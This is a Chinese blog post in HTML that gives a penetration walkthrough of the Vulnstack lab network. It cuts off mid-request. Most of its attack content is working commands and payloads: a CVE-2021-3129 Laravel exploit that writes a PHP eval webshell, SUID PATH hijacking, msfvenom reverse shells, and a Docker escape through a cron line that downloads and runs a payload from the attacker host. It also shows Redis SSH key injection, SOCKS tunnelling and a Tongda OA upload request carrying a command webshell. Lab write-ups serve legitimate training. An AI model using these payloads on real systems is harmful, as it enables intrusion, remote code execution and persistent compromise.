@@ -1,0 +1,881 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="ZERO">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言靶场下载链接：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;9&#x2F; 参考链接：https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;354890.html 拓扑图：  环境配置目标IP：192.168.40.136 第一层网络DMZ-Web1（Ubuntu）： 网卡1：192.168.40.136 网卡2：192.168.52.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="不同环境下内网渗透的相关技巧">
+<meta property="og:url" content="http://example.com/2024/06/17/domain1/index.html">
+<meta property="og:site_name" content="ZERO&#39;s Blog">
+<meta property="og:description" content="前言靶场下载链接：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;9&#x2F; 参考链接：https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;354890.html 拓扑图：  环境配置目标IP：192.168.40.136 第一层网络DMZ-Web1（Ubuntu）： 网卡1：192.168.40.136 网卡2：192.168.52.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/example.jpg">
+<meta property="article:published_time" content="2024-06-17T00:29:11.000Z">
+<meta property="article:modified_time" content="2024-07-10T12:01:42.112Z">
+<meta property="article:author" content="ZERO">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="信息收集">
+<meta property="article:tag" content="相关指令">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/example.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>不同环境下内网渗透的相关技巧 - ZERO&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":"G-C16YBJWRLK"},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=G-C16YBJWRLK", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', 'G-C16YBJWRLK');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>ZERO&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/example1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="不同环境下内网渗透的相关技巧"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-06-17 08:29" pubdate>
+          2024年6月17日 早上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          24 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">不同环境下内网渗透的相关技巧</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>靶场下载链接：</strong><a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/9/">http://vulnstack.qiyuanxuetang.net/vuln/detail/9/</a></p>
+<p><strong>参考链接：</strong><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/354890.html">https://www.freebuf.com/articles/web/354890.html</a></p>
+<p><strong>拓扑图：</strong></p>
+<p><img src="/img/domain1.png" srcset="/img/loading.gif" lazyload alt="domain1"></p>
+<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p><strong>目标IP：</strong>192.168.40.136</p>
+<p><strong>第一层网络DMZ-Web1（Ubuntu）：</strong></p>
+<p>网卡1：192.168.40.136</p>
+<p>网卡2：192.168.52.10</p>
+<p><strong>第二层网络-Web2（Ubuntu）：</strong></p>
+<p>网卡1：192.168.52.20</p>
+<p>网卡2：192.168.93.10</p>
+<p><strong>第二层网络-PC1（Windows 7）：</strong></p>
+<p>网卡1：192.168.52.30</p>
+<p>网科2：192.168.93.20</p>
+<p><strong>第三层网络-PC2（Windows 7）：</strong></p>
+<p>网卡1：192.168.93.40</p>
+<p><strong>第三层网络-Server（Windows Server 2012）：</strong></p>
+<p>网卡1：192.168.93.30</p>
+<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>拿到目标IP后，使用nmap对目标IP进行常规的信息搜集</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">nmap -T4 -p<span class="hljs-number">1-65535</span> -<span class="hljs-keyword">A</span> <span class="hljs-number">192.168.40.136</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/domain2.png" srcset="/img/loading.gif" lazyload alt="domain2"></p>
+<p>发现其81端口开放且存在<strong>Laravel</strong>框架，此外6379端口存在<strong>Redis</strong>服务</p>
+<p>根据此处<strong>Laravel</strong>框架的版本，推测其存在<strong>CVE-2021-3129</strong>漏洞</p>
+<p>利用<a target="_blank" rel="noopener" href="https://github.com/zhzyker/CVE-2021-3129">Laravel漏洞检测工具</a>进行检测，发现其存在相关漏洞</p>
+<p><img src="/img/domain3.png" srcset="/img/loading.gif" lazyload alt="domain3"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>利用<a target="_blank" rel="noopener" href="https://github.com/crisprss/Laravel_CVE-2021-3129_EXP">CVE-2021-3129的利用脚本</a>写入木马</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">&quot;system(&#x27;echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d &gt; /var/www/html/shell.php&#x27;);&quot; --phar phar -o php://output | base64 -w 0 | python -c &quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:] + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;<br><br>/*<br>system(&#x27;echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d &gt; /var/www/html/shell.php&#x27;);<br>这行命令通过 PHP 的 system 函数执行一个 shell 命令。具体命令是将字符串 PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4= 通过 base64 解码，然后将解码后的内容写入到 /var/www/html/shell.php 文件中<br><br>phar phar -o php://output<br>这部分命令的目的是将 PHAR 文件的输出内容重定向到标准输出 (php://output)<br><br>base64 -w 0<br>将上一步的输出通过 base64 编码，并且不换行 (-w 0 表示输出时不换行)<br><br>python -c &quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:] + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;<br>这部分 Python 代码从标准输入读取数据，并将每个字符转换为十六进制表示，然后格式化为 =xx=00 的形式并输出。比如字符 A 会被转换为 =41=00<br>*/<br></code></pre></td></tr></table></figure>
+
+<p>然后执行</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> Laravel_CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">3129</span>_EXP.py <span class="hljs-string">&quot;system(&#x27;echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d &gt; /var/www/html/test.php&#x27;);&quot;</span> --phar phar -o php://output | base64 -w <span class="hljs-number">0</span> | python -c <span class="hljs-string">&quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:] + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>直接访问192.168.40.136:81&#x2F;shell.php执行命令，可知木马写入成功</p>
+<p><img src="/img/domain4.png" srcset="/img/loading.gif" lazyload alt="domain3"></p>
+<p>然后使用蚁剑进行连接，输入命令检测后，发现目前该shell目前是在Docker容器中</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /proc/self/cgroup<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/domain5.png" srcset="/img/loading.gif" lazyload alt="domain3"></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>面对这种情况，需要想办法进行<strong>Docker逃逸</strong>从而获取该主机的权限，但在此之前，由于我们拿到的用户为<strong>www-data</strong>权限太小，所以我们需要进行提权</p>
+<p>这里我们使用find命令来搜索具有SUID的文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -perm -u=s -type f 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+
+<p>根据上面的命令，我们可以遍历所有可执行文件，这里我们发现**&#x2F;home&#x2F;jobs<strong>目录下存在一个名为</strong>shell**的文件，且存在SUID的权限</p>
+<p>尝试运行shell文件，可以发现其执行了ps命令，并且没有使用绝对路径，因此尝试更改**$PATH**来执行我们构造的恶意程序，从而获取更高权限的shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /tmp<br>echo &quot;/bin/bash&quot; &gt; ps<br>chmod 777 ps<br>echo $PATH <br>export PATH=/tmp:$PATH # 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序<br>cd /home/jobs<br>./shell<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/domain6.png" srcset="/img/loading.gif" lazyload alt="domain3"></p>
+<p>之后可以使用msf生成木马，并将其上传到目标容器执行，然后使用metasploit进行反弹得到shell，具体操作如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.40.142 LPORT=4444 -f elf -o test.elf<br></code></pre></td></tr></table></figure>
+
+<p>将生成的<strong>test.elf</strong>上传到服务器</p>
+<p>然后使用<strong>msfconsole</strong>进行监听</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfconsole<br>use exploit/multi/handler<br>set payload linux/x64/meterpreter/reverse_tcp<br>set lhost 192.168.40.142<br>set lport 4444<br>run<br></code></pre></td></tr></table></figure>
+
+<p>然后运行上传到服务器的test.elf，成功得到shell</p>
+<p><img src="/img/domain7.png" srcset="/img/loading.gif" lazyload alt="domain3"></p>
+<h2 id="Docker逃逸"><a href="#Docker逃逸" class="headerlink" title="Docker逃逸"></a>Docker逃逸</h2><ul>
+<li>特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。</li>
+<li>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。</li>
+<li>当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</li>
+</ul>
+<p>查看挂载目录，发现挂载有其他目录</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">fdisk -l<br></code></pre></td></tr></table></figure>
+
+<p>在根目录创建<strong>test</strong>目录，并将**&#x2F;dev&#x2F;sda1**挂载上去</p>
+<p>这时我们可以通过访问容器内部的**&#x2F;test**来实现访问整台宿主机</p>
+<p><strong>注意！在docker容器里挂载一个宿主的本地目录，这样某些容器里输出的文件，就可以在本地目录中打开访问了</strong></p>
+<p>使用metasploit的web_delivery模块生成payload</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">use exploit/multi/script/web_delivery<br>set target 7<br>set payload linux/x64/meterpreter/reverse_tcp<br>set lhost 192.168.40.142<br>set lport 5555<br>run<br></code></pre></td></tr></table></figure>
+
+<p>将生成的命令在目标主机上执行，从而得到目标主机的<strong>meterpreter</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &#x27;* * * * * wget -qO TDkiFNiS --no-check-certificate http://192.168.40.142:8080/9eE8P9ar5J; chmod +x TDkiFNiS; ./TDkiFNiS&amp; disown&#x27; &gt;&gt; /test/var/spool/cron/crontabs/root<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/domain8.png" srcset="/img/loading.gif" lazyload alt="domain3"></p>
+<p>通过信息搜集，我们可以得到以下有用信息：</p>
+<ul>
+<li>该主机系统版本为：Ubuntu 14.04</li>
+<li>该主机存在两个内网IP：192.168.52.20 和 192.168.93.10</li>
+</ul>
+<p>这里会发现没有我们所访问的入口地址192.168.40.136</p>
+<p>这边我们再尝试6379端口的<strong>redis</strong>服务，发现其存在未授权访问，直接进行连接</p>
+<p>直接进行利用，通过在攻击机生成<strong>ssh公钥</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh-keygen -t rsa<br></code></pre></td></tr></table></figure>
+
+<p>然后将生成的公钥导入<strong>key.txt</strong>中，再将key.txt的内容写入目标主机的redis缓冲里</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt<br><br>cat key.txt | redis-cli -h 192.168.1.8 -x set xxx<br></code></pre></td></tr></table></figure>
+
+<p><strong>注意！前后用\n换行，避免和Redis里其他缓存数据混合，-x 代表从标准输入读取数据作为该命令的最后一个参数</strong></p>
+<p>然后使用攻击机连接目标的<strong>Redis</strong>，然后执行命令将<strong>ssh公钥</strong>写入目标主机</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">config set dir /root/.ssh    # 设置redis的备份路径为/root/.ssh/<br>config set dbfilename authorized_keys    # 设置保存文件名为authorized_keys<br>save    # 将数据保存在目标服务器硬盘上<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/domain9.png" srcset="/img/loading.gif" lazyload alt="domain3"></p>
+<p>写入后尝试连接，成功连接上目标主机</p>
+<p><img src="/img/domain10.png" srcset="/img/loading.gif" lazyload alt="domain3"></p>
+<p>此处查看网络信息，发现也存在两个IP，192.168.40.136 和 192.168.52.10</p>
+<p>操作系统为Ubuntu 18.04</p>
+<p>由此可知目标的网站应该做了反向代理，此Ubuntu 18.04仅仅提供一个代理服务，真正的Web服务器在那台Ubuntu 14.04上，Ubuntu 18.04的Nginx将81端口上收到的请求转发给了内网第二层网络的Web服务器192.168.52.20也就是Ubuntu 14.04</p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>在Ubuntu 18.04服务器使用earthworm搭建socks5反向代理服务，在攻击机执行命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./ew_for_linux64 -s rcsocks -l 1080 -e 1234<br></code></pre></td></tr></table></figure>
+
+<p>在Ubuntu 18.04执行命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./ew_for_linux64 -s rssocks -d 192.168.40.142 -e 1234<br></code></pre></td></tr></table></figure>
+
+<p>然后在攻击机修改proxychains的配置文件（一般路径在&#x2F;etc&#x2F;proxychains.conf）在文件底部修改：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">socks5</span> <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">1080</span><br></code></pre></td></tr></table></figure>
+
+<p>然后使用<strong>namp</strong>进行扫描，发现存在192.168.52.30主机，且开放了相关端口，在其8080端口上存在<strong>通达OA</strong>系统，将浏览器设置代理后，成功访问</p>
+<p><img src="/img/domain11.png" srcset="/img/loading.gif" lazyload alt="domain3"></p>
+<p>通过搜索，结合网上纰漏的通达的漏洞，通过未授权登录成功获得session</p>
+<p>之后利用文件上传漏洞，成功上传木马</p>
+<p><strong>注意！此处我在复现过程中，需要将session修改为未授权登录所获得的session</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ispirit/im/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.52.30:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>679<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=0nq2ah0avu1qn3ea4sheo41ha7<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;UPLOAD_MODE&quot;</span></span><br><span class="language-php"></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-number">2</span></span><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;P&quot;</span></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-number">0</span>nq2ah0avu1qn3ea4sheo41ha7</span><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;DEST_UID&quot;</span></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-number">1</span></span><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;ATTACHMENT&quot;</span>; filename=<span class="hljs-string">&quot;jpg&quot;</span></span><br><span class="language-php">Content-Type: image/jpeg</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-variable">$command</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];</span><br><span class="language-php"><span class="hljs-variable">$wsh</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">COM</span>(<span class="hljs-string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="language-php"><span class="hljs-variable">$exec</span> = <span class="hljs-variable">$wsh</span>-&gt;<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;cmd /c &quot;</span>.<span class="hljs-variable">$command</span>);</span><br><span class="language-php"><span class="hljs-variable">$stdout</span> = <span class="hljs-variable">$exec</span>-&gt;<span class="hljs-title function_ invoke__">StdOut</span>();</span><br><span class="language-php"><span class="hljs-variable">$stroutput</span> = <span class="hljs-variable">$stdout</span>-&gt;<span class="hljs-title function_ invoke__">ReadAll</span>();</span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-variable">$stroutput</span>;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB--</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/domain12.png" srcset="/img/loading.gif" lazyload alt="domain3"></p>
+<p>再结合文件包含来执行命令，成功rce</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ispirit/interface/gateway.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.52.30:8080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>python-requests/2.21.0<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>69<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-dockerfile">json=&#123;<span class="hljs-string">&quot;url&quot;</span>:<span 